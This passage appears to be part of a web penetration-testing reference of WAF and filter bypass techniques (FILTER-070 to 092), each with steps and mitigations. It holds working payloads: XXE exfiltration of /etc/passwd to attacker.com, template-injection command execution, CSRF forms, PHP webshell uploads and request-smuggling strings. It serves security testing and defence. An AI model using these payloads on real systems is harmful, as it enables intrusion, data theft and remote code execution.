**Tools:** Burp Suite, zip/unzip tools

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PayloadsAllTheThings XXE, Bug bounty reports

---

## FILTER-070 — XXE via Parameter Entities
**Test Category:** XXE · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/Filter

**Where to Test / Injection Point:** XML request body — behind WAF/Filter

**How It Works:** Direct entities blocked; use parameter entities for OOB exfiltration

**Detection Method:** Try parameter entities when regular entities blocked

**Test Steps:** 1. Regular &amp;xxe; blocked 2. Host DTD on attacker server with parameter entity 3. Reference external DTD from payload 4. Data sent to attacker via OOB

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Filter and reaches the sink — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Payload Example:**

```
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]> where evil.dtd contains: <!ENTITY % data SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; send SYSTEM 'http://attacker.com/?d=%data;'>">%eval;%send;
```

**Why It Works:** Parameter entities (%) work in DTD context; bypass filters checking for regular entities (&amp;); OOB exfiltration avoids response-based detection

**Impact:** Filter/WAF bypass enabling XXE — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Mitigation:** Disable all DTD processing; disable external entity resolution

**Tools:** Burp Collaborator, XXEinjector

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger Blind XXE, OWASP XXE

---

## FILTER-071 — XXE via XInclude
**Test Category:** XXE · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** WAF/Filter

**Where to Test / Injection Point:** XML request body — behind WAF/Filter

**How It Works:** When you can't control entire XML document but inject into XML value; use XInclude

**Detection Method:** Test XInclude namespace and include directive

**Test Steps:** 1. Input is inserted into server's XML document 2. Can't inject DOCTYPE 3. Use XInclude: &lt;xi:include&gt; element 4. Include file content

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/Filter and reaches the sink — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Payload Example:**

```
<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
```

**Why It Works:** XInclude allows including external resources within any XML element; doesn't require DOCTYPE declaration

**Impact:** Filter/WAF bypass enabling XXE — XML external entity resolves (file read / SSRF / OOB exfiltration)

**Mitigation:** Disable XInclude processing in XML parser

**Tools:** Burp Suite

**References:** CWE-611; -&gt;[XXE checklist](#/checklist/xxe); PortSwigger XInclude lab, W3C XInclude spec

---

## FILTER-072 — SSTI Detection - Universal Polyglot
**Test Category:** SSTI · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** template-rendered input — behind Server-Side Blacklist Filter

**How It Works:** Identify template engine by injecting mathematical expressions processed by template engine

**Detection Method:** Inject template expressions in all input fields

**Test Steps:** 1. Submit {{7*7}} and check if 49 appears 2. Try ${7*7} 3. Try #{7*7} 4. Try &lt;%= 7*7 %&gt; 5. Try {7*7} 6. Compare which syntax evaluates

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — template expression evaluates server-side (escalates to RCE)

**Payload Example:**

```
{{7*7}} (Jinja2/Twig) | ${7*7} (FreeMarker/Velocity) | #{7*7} (Thymeleaf/Ruby) | <%= 7*7 %> (ERB/EJS) | {{=7*7}} (doT.js)
```

**Why It Works:** Template engines evaluate expressions in their syntax; mathematical expression is safe way to detect without triggering errors

**Impact:** Filter/WAF bypass enabling SSTI — template expression evaluates server-side (escalates to RCE)

**Mitigation:** Use logic-less templates; sandbox template execution; never pass user input as template string

**Tools:** Burp Suite, tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI labs, PayloadsAllTheThings SSTI

---

## FILTER-073 — Jinja2 SSTI RCE Bypass
**Test Category:** SSTI · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** template-rendered input — behind Server-Side Blacklist Filter

**How It Works:** Common Jinja2 RCE payloads blocked; use MRO chain or attribute access tricks

**Detection Method:** Try class hierarchy traversal when direct methods blocked

**Test Steps:** 1. {{config}} blocked → try {{self.__class__}} 2. Try MRO chain: {{''.__class__.__mro__[1].__subclasses__()}} 3. Find os._wrap_close or subprocess.Popen index 4. Execute

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — template expression evaluates server-side (escalates to RCE)

**Payload Example:**

```
{{''.__class__.__mro__[1].__subclasses__()[407]('id',shell=True,stdout=-1).communicate()}} | {{request.__class__.__mro__[1].__subclasses__()[287]('id',shell=True,stdout=-1).communicate()}} | {{lipsum.__globals__['os'].popen('id').read()}}
```

**Why It Works:** Python MRO (Method Resolution Order) allows traversing class hierarchy to reach os/subprocess; attribute access notation bypasses keyword filters

**Impact:** Filter/WAF bypass enabling SSTI — template expression evaluates server-side (escalates to RCE)

**Mitigation:** Sandbox Jinja2; use SandboxedEnvironment; don't render user input as templates

**Tools:** tplmap, Burp Suite

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PayloadsAllTheThings SSTI, James Kettle research

---

## FILTER-074 — Jinja2 Filter Bypass - attr() and string manipulation
**Test Category:** SSTI · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist Filter

**Where to Test / Injection Point:** template-rendered input — behind Server-Side Blacklist Filter

**How It Works:** Underscores __ or dot access blocked; use |attr() filter or bracket notation

**Detection Method:** Use Jinja2 filters to access attributes without dots or underscores

**Test Steps:** 1. Confirm __ or . blocked 2. Use |attr('__class__') instead of .__class__ 3. Use bracket notation: ['__class__'] 4. Construct strings dynamically

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist Filter and reaches the sink — template expression evaluates server-side (escalates to RCE)

**Payload Example:**

```
{{()|attr('__class__')|attr('__mro__')|last|attr('__subclasses__')()}} | {{request|attr('application')|attr('\\x5f\\x5fglobals\\x5f\\x5f')|attr('\\x5f\\x5fgetitem\\x5f\\x5f')('\\x5f\\x5fbuiltins\\x5f\\x5f')}}
```

**Why It Works:** Jinja2 attr() filter accesses attributes by string name; hex escapes \\x5f represent underscores; avoids literal __ in payload

**Impact:** Filter/WAF bypass enabling SSTI — template expression evaluates server-side (escalates to RCE)

**Mitigation:** Block template syntax entirely in user input; use allowlist rendering

**Tools:** tplmap, Burp Suite

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PayloadsAllTheThings, HackTricks SSTI

---

## FILTER-075 — SSTI - Alternate Template Engines (Freemarker/Velocity/Pebble)
**Test Category:** SSTI · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF (Generic)

**Where to Test / Injection Point:** template-rendered input — behind WAF (Generic)

**How It Works:** Each template engine has unique RCE syntax; test all

**Detection Method:** Identify template engine and use engine-specific payload

**Test Steps:** 1. Detect engine: ${7*7} evaluates? → FreeMarker/Velocity 2. FreeMarker: &lt;#assign ex="freemarker.template.utility.Execute"?new()&gt;${ex("id")} 3. Velocity: #set($x='')##$x.getClass().forName('java.lang.Runtime').getRuntime().exec('id')

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF (Generic) and reaches the sink — template expression evaluates server-side (escalates to RCE)

**Payload Example:**

```
FreeMarker: ${"freemarker.template.utility.Execute"?new()("id")} | Velocity: #set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$rt.getRuntime().exec('id')) | Pebble: {{'id'|filter('system')}}
```

**Why It Works:** Each template engine has different built-in methods for code execution; WAF rules for one engine don't apply to another

**Impact:** Filter/WAF bypass enabling SSTI — template expression evaluates server-side (escalates to RCE)

**Mitigation:** Sandbox template execution; disable dangerous built-ins; use latest engine version

**Tools:** tplmap, SSTImap, Burp

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PayloadsAllTheThings SSTI, PortSwigger

---

## FILTER-076 — SSTI - String Concatenation to Avoid Keywords
**Test Category:** SSTI · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** template-rendered input — behind Server-Side Filter

**How It Works:** Keywords like 'class' or 'import' are blocked; construct them via string concatenation

**Detection Method:** Use string operations to build blocked keywords

**Test Steps:** 1. 'class' blocked 2. Build string: 'cla'+'ss' or 'cla''ss' 3. Use hex: '\\x63lass' 4. Use reverse: 'ssalc'[::-1]

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — template expression evaluates server-side (escalates to RCE)

**Payload Example:**

```
{{()|attr('\\x5f\\x5fcl'+'ass\\x5f\\x5f')}} | {{request|attr(['__cla','ss__']|join)}} | {{request|attr('\\x5f\\x5fclass\\x5f\\x5f')}}
```

**Why It Works:** String concatenation happens at runtime after filter inspection; filter sees fragments not complete blocked keyword

**Impact:** Filter/WAF bypass enabling SSTI — template expression evaluates server-side (escalates to RCE)

**Mitigation:** Don't allow any template syntax in user input

**Tools:** Burp Suite, tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PayloadsAllTheThings, HackTricks

---

## FILTER-077 — CSRF Token Not Validated
**Test Category:** CSRF · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Client-Side (CSRF Token)

**Where to Test / Injection Point:** state-changing endpoint — behind Client-Side (CSRF Token)

**How It Works:** Application includes CSRF token but server doesn't actually validate it

**Detection Method:** Remove CSRF token from request and observe if request still succeeds

**Test Steps:** 1. Intercept request with CSRF token 2. Remove token parameter entirely 3. Forward request 4. Check if action completes successfully

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side (CSRF Token) and reaches the sink — forged state-changing request runs in the victim's session

**Payload Example:**

```
Remove csrf_token parameter from POST request body entirely
```

**Why It Works:** Developer added token field but forgot server-side validation; server ignores missing/invalid token

**Impact:** Filter/WAF bypass enabling CSRF — forged state-changing request runs in the victim's session

**Mitigation:** Always validate CSRF token server-side; reject requests with missing tokens

**Tools:** Burp Suite

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF labs, OWASP CSRF Prevention

---

## FILTER-078 — CSRF Token Tied to Wrong Session
**Test Category:** CSRF · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Client-Side (CSRF Token)

**Where to Test / Injection Point:** state-changing endpoint — behind Client-Side (CSRF Token)

**How It Works:** CSRF token is valid but not tied to user's session; any valid token works for any user

**Detection Method:** Swap CSRF token between two different user sessions

**Test Steps:** 1. Login as User A; get CSRF token 2. Login as User B in different browser 3. Use User A's CSRF token in User B's request 4. Check if accepted

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side (CSRF Token) and reaches the sink — forged state-changing request runs in the victim's session

**Payload Example:**

```
Use csrf_token from Account A in request authenticated as Account B
```

**Why It Works:** Token validation checks if token exists in global pool but doesn't verify it belongs to the requesting session

**Impact:** Filter/WAF bypass enabling CSRF — forged state-changing request runs in the victim's session

**Mitigation:** Tie CSRF token to specific session; validate token-session binding

**Tools:** Burp Suite with 2 browser sessions

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF labs, OWASP

---

## FILTER-079 — CSRF via Method Override
**Test Category:** CSRF · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** Client-Side (CSRF Token)

**Where to Test / Injection Point:** state-changing endpoint — behind Client-Side (CSRF Token)

**How It Works:** POST with CSRF token required but GET request accepted without token

**Detection Method:** Change POST to GET to bypass CSRF check

**Test Steps:** 1. POST /change-email requires CSRF token 2. Change method to GET: GET /change-email?email=attacker@evil.com 3. Check if accepted without token

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Client-Side (CSRF Token) and reaches the sink — forged state-changing request runs in the victim's session

**Payload Example:**

```
GET /change-email?email=attacker@evil.com (changed from POST)
```

**Why It Works:** Application checks CSRF token only for POST; GET requests bypass the check

**Impact:** Filter/WAF bypass enabling CSRF — forged state-changing request runs in the victim's session

**Mitigation:** Validate CSRF token for all state-changing requests regardless of method; use SameSite cookies

**Tools:** Burp Suite (change request method)

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF labs

---

## FILTER-080 — SameSite=Lax Bypass via GET
**Test Category:** CSRF · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Security Control Bypassed:** SameSite Cookie Protection

**Where to Test / Injection Point:** state-changing endpoint — behind SameSite Cookie Protection

**How It Works:** SameSite=Lax allows GET requests from cross-site; exploit if state change via GET possible

**Detection Method:** Check if state-changing operations accept GET

**Test Steps:** 1. Identify SameSite=Lax on session cookie 2. Check if POST endpoint also accepts GET 3. Create cross-site page with &lt;a href&gt; or top-level navigation to target

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades SameSite Cookie Protection and reaches the sink — forged state-changing request runs in the victim's session

**Payload Example:**

```
<a href="https://target.com/change-email?email=attacker@evil.com">Click</a> | window.location='https://target.com/change-email?email=evil@evil.com'
```

**Why It Works:** SameSite=Lax sends cookies on top-level GET navigations (links/redirects); if app accepts GET for state changes it's vulnerable

**Impact:** Filter/WAF bypass enabling CSRF — forged state-changing request runs in the victim's session

**Mitigation:** Use SameSite=Strict; ensure state-changing endpoints only accept POST; validate CSRF token

**Tools:** Burp Suite, HTML page hosting

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger SameSite labs, RFC 6265bis

---

## FILTER-081 — CSRF via Image Tag / Auto-Submit Form
**Test Category:** CSRF · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Security Control Bypassed:** No CSRF Protection

**Where to Test / Injection Point:** state-changing endpoint — behind No CSRF Protection

**How It Works:** No CSRF protection exists; craft auto-submitting cross-site form

**Detection Method:** Check if CSRF token is absent from requests

**Test Steps:** 1. Confirm no CSRF token in state-changing requests 2. Create HTML page with auto-submit form targeting victim endpoint 3. Host and send to victim

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades No CSRF Protection and reaches the sink — forged state-changing request runs in the victim's session

**Payload Example:**

```
<form action="https://target.com/transfer" method="POST"><input name="to" value="attacker"><input name="amount" value="10000"></form><script>document.forms[0].submit()</script>
```

**Why It Works:** No CSRF protection means any cross-site page can submit authenticated requests as the victim

**Impact:** Filter/WAF bypass enabling CSRF — forged state-changing request runs in the victim's session

**Mitigation:** Implement CSRF tokens; SameSite cookies; check Origin/Referer headers

**Tools:** Burp Suite, HTML hosting

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); OWASP CSRF, PortSwigger

---

## FILTER-082 — Extension Bypass - Double Extension
**Test Category:** File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** file-upload field — behind Server-Side Blacklist

**How It Works:** Filter blocks .php but not .php.jpg or .php5

**Detection Method:** Try alternative and double extensions

**Test Steps:** 1. Upload shell.php (blocked) 2. Try shell.php.jpg 3. Try shell.php5 4. Try shell.phtml 5. Try shell.pHP

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
shell.php.jpg | shell.php5 | shell.phtml | shell.pHP | shell.php%00.jpg | shell.php;.jpg
```

**Why It Works:** Apache may execute .php.jpg if AddHandler php applies; alternative extensions (php5/phtml) may be configured; case variation bypasses case-sensitive checks

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Use allowlist of permitted extensions; validate file content (magic bytes); store uploads outside webroot

**Tools:** Burp Suite

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); OWASP File Upload, PayloadsAllTheThings Upload

---

## FILTER-083 — Content-Type Bypass
**Test Category:** File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** file-upload field — behind Server-Side Blacklist

**How It Works:** Filter checks Content-Type header which attacker controls

**Detection Method:** Change Content-Type in upload request

**Test Steps:** 1. Upload .php file → Content-Type: application/x-php (blocked) 2. Change Content-Type to image/jpeg 3. Keep .php extension 4. Forward

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
Content-Type: image/jpeg (while uploading shell.php)
```

**Why It Works:** Content-Type header is client-controlled; filter trusts client-declared type instead of validating actual content

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Validate file content (magic bytes); don't trust Content-Type; use allowlist extensions

**Tools:** Burp Suite

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); OWASP File Upload, PortSwigger

---

## FILTER-084 — Magic Byte Prepend
**Test Category:** File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** file-upload field — behind Server-Side Blacklist

**How It Works:** Filter validates file magic bytes; prepend valid magic bytes before malicious content

**Detection Method:** Add image magic bytes before PHP code

**Test Steps:** 1. Filter checks first bytes for image signature 2. Prepend GIF89a before PHP code 3. Upload with image extension then access

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
GIF89a<?php system($_GET['c']); ?> (save as shell.gif.php) | \xFF\xD8\xFF\xE0 (JPEG magic) followed by PHP code
```

**Why It Works:** Magic byte check only validates first few bytes; PHP engine ignores non-PHP content before &lt;?php tag

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Validate entire file structure not just magic bytes; reprocess images; disable script execution in upload directory

**Tools:** Burp Suite, hex editor

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PayloadsAllTheThings File Upload

---

## FILTER-085 — Filename Null Byte (PHP &lt; 5.3.4)
**Test Category:** File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Blacklist

**Where to Test / Injection Point:** file-upload field — behind Server-Side Blacklist

**How It Works:** Null byte in filename truncates path before extension check but OS ignores it

**Detection Method:** Insert %00 before fake extension

**Test Steps:** 1. Upload shell.php%00.jpg 2. Filter sees .jpg extension (allowed) 3. File saved as shell.php (null byte truncates) 4. Access shell.php

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Blacklist and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
shell.php%00.jpg | shell.php%00.png
```

**Why It Works:** C-based string functions in older PHP treat %00 as string terminator; extension check sees .jpg but filesystem saves as .php

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Update PHP runtime; validate filename after URL decoding; reject null bytes in filenames

**Tools:** Burp Suite

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); CVE-2006-7243, OWASP

---

## FILTER-086 — Upload via PUT Method
**Test Category:** File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side/WAF

**Where to Test / Injection Point:** file-upload field — behind Server-Side/WAF

**How It Works:** POST upload is restricted but PUT method may be accepted

**Detection Method:** Test PUT method for file upload

**Test Steps:** 1. POST upload blocked/restricted 2. Try PUT /uploads/shell.php with file body 3. Try MOVE method after uploading safe file

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side/WAF and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
PUT /uploads/shell.php HTTP/1.1\r\n\r\n<?php system($_GET['c']); ?>
```

**Why It Works:** WebDAV or misconfigured servers accept PUT for file creation; PUT may not go through same validation as POST upload

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Disable PUT/DELETE/MOVE methods; validate all file write operations regardless of HTTP method

**Tools:** Burp Suite, curl -X PUT

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); OWASP, Web server hardening guides

---

## FILTER-087 — Race Condition Upload
**Test Category:** File Upload · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** file-upload field — behind Server-Side Filter

**How It Works:** File is uploaded then validated then deleted if invalid; access file between upload and deletion

**Detection Method:** Upload malicious file and immediately request it before deletion

**Test Steps:** 1. Upload PHP webshell 2. Immediately send multiple GET requests to uploaded file 3. Use Turbo Intruder for race condition 4. One request may execute before deletion

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
Upload shell.php + simultaneously GET /uploads/shell.php (race condition)
```

**Why It Works:** Time-of-check to time-of-use (TOCTOU) gap between upload and validation/deletion allows brief execution window

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Validate before saving; save to temp non-executable location; move only after validation

**Tools:** Burp Turbo Intruder

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger Race Condition Upload lab

---

## FILTER-088 — .htaccess Upload
**Test Category:** File Upload · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** Server-Side Filter

**Where to Test / Injection Point:** file-upload field — behind Server-Side Filter

**How It Works:** Upload .htaccess file to enable PHP execution in upload directory

**Detection Method:** Try uploading .htaccess to upload directory

**Test Steps:** 1. Upload .htaccess with: AddType application/x-httpd-php .jpg 2. Upload webshell.jpg containing PHP code 3. Access webshell.jpg which now executes as PHP

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades Server-Side Filter and reaches the sink — malicious file is stored/executed (webshell/RCE or stored XSS)

**Payload Example:**

```
Upload .htaccess containing: AddType application/x-httpd-php .jpg\r\nThen upload webshell.jpg with PHP code
```

**Why It Works:** Apache reads .htaccess per-directory; uploaded .htaccess reconfigures upload directory to execute .jpg as PHP

**Impact:** Filter/WAF bypass enabling File Upload — malicious file is stored/executed (webshell/RCE or stored XSS)

**Mitigation:** Disable .htaccess (AllowOverride None); filter .htaccess from uploads; store files outside webroot

**Tools:** Burp Suite

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); OWASP File Upload, PayloadsAllTheThings

---

## FILTER-089 — CL.TE Smuggling
**Test Category:** HTTP Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/CDN/Reverse Proxy

**Where to Test / Injection Point:** CL/TE request boundary — behind WAF/CDN/Reverse Proxy

**How It Works:** Front-end uses Content-Length; back-end uses Transfer-Encoding; smuggle second request

**Detection Method:** Test for CL.TE desync between proxy and backend

**Test Steps:** 1. Send request with both CL and TE headers 2. CL value accounts for partial body 3. TE chunked body contains smuggled request prefix 4. Back-end treats remainder as new request

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/CDN/Reverse Proxy and reaches the sink — front-end/back-end desync (request hijack, cache poisoning)

**Payload Example:**

```
POST / HTTP/1.1\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG (smuggled G becomes start of next request as GPOST)
```

**Why It Works:** Front-end forwards based on CL (6 bytes: '0\\r\\n\\r\\nG'); back-end parses TE chunked; sees 0-length chunk (request ends); 'G' becomes prefix of next request

**Impact:** Filter/WAF bypass enabling HTTP Request Smuggling — front-end/back-end desync (request hijack, cache poisoning)

**Mitigation:** Normalize CL/TE handling; reject ambiguous requests; use HTTP/2 end-to-end

**Tools:** Burp Suite HTTP Request Smuggler extension, smuggler.py

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); PortSwigger HTTP Request Smuggling, James Kettle research

---

## FILTER-090 — TE.CL Smuggling
**Test Category:** HTTP Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/CDN/Reverse Proxy

**Where to Test / Injection Point:** CL/TE request boundary — behind WAF/CDN/Reverse Proxy

**How It Works:** Front-end uses Transfer-Encoding; back-end uses Content-Length

**Detection Method:** Test for TE.CL desync

**Test Steps:** 1. Send request with both TE and CL 2. TE contains chunked body with embedded request 3. CL value is smaller than total body 4. Front-end forwards all (TE); back-end reads CL bytes only

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/CDN/Reverse Proxy and reaches the sink — front-end/back-end desync (request hijack, cache poisoning)

**Payload Example:**

```
POST / HTTP/1.1\r\nContent-Length: 3\r\nTransfer-Encoding: chunked\r\n\r\n1e\r\nGPOST / HTTP/1.1\r\nHost:x\r\n\r\n0\r\n\r\n
```

**Why It Works:** Front-end processes entire chunked body; back-end reads only CL=3 bytes; remaining bytes become next request

**Impact:** Filter/WAF bypass enabling HTTP Request Smuggling — front-end/back-end desync (request hijack, cache poisoning)

**Mitigation:** Standardize header preference; reject requests with both CL and TE; use HTTP/2

**Tools:** Burp HTTP Request Smuggler, smuggler.py

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); PortSwigger, James Kettle DEF CON presentation

---

## FILTER-091 — TE.TE Obfuscation
**Test Category:** HTTP Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/CDN/Reverse Proxy

**Where to Test / Injection Point:** CL/TE request boundary — behind WAF/CDN/Reverse Proxy

**How It Works:** Both servers use TE but one can be confused by obfuscated TE header

**Detection Method:** Obfuscate Transfer-Encoding header to cause differential parsing

**Test Steps:** 1. Send obfuscated TE headers 2. One server processes TE (chunked) other falls back to CL 3. Desync achieved

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/CDN/Reverse Proxy and reaches the sink — front-end/back-end desync (request hijack, cache poisoning)

**Payload Example:**

```
Transfer-Encoding: chunked\r\nTransfer-encoding: x | Transfer-Encoding: xchunked | Transfer-Encoding : chunked (space before colon) | Transfer-Encoding:\tchunked
```

**Why It Works:** HTTP spec requires specific TE format; obfuscation causes one server to recognize chunked and other to ignore it; different header processing creates desync

**Impact:** Filter/WAF bypass enabling HTTP Request Smuggling — front-end/back-end desync (request hijack, cache poisoning)

**Mitigation:** Strictly validate Transfer-Encoding; reject non-standard values; normalize headers

**Tools:** Burp HTTP Request Smuggler

**References:** CWE-444; -&gt;[Request Smuggling checklist](#/checklist/smuggling); PortSwigger, RFC 7230

---

## FILTER-092 — HTTP/2 Downgrade Smuggling (H2.CL / H2.TE)
**Test Category:** HTTP Request Smuggling · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Security Control Bypassed:** WAF/CDN

**Where to Test / Injection Point:** CL/TE request boundary — behind WAF/CDN

**How It Works:** HTTP/2 frontend downgrades to HTTP/1.1 for backend; headers can be injected during downgrade

**Detection Method:** Test if frontend accepts HTTP/2 and backend is HTTP/1.1

**Test Steps:** 1. Send HTTP/2 request with malicious pseudo-headers 2. Frontend downgrades to HTTP/1.1 3. Injected headers/body create smuggled request

**Expected Result:** Naive payload is blocked by the control; the bypass variant evades WAF/CDN and reaches the sink — front-end/back-end desync (request hijack, cache poisoning)

**Payload Example:**

```
HTTP/2 request with body containing: 0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n (smuggled via H2.CL)
```

**Why It Works:** HTTP/2 binary framing doesn't have CL/TE ambiguity but downgrade to HTTP/1.1 introduces it; HTTP/2 headers can contain characters that become HTTP/1.1 injection

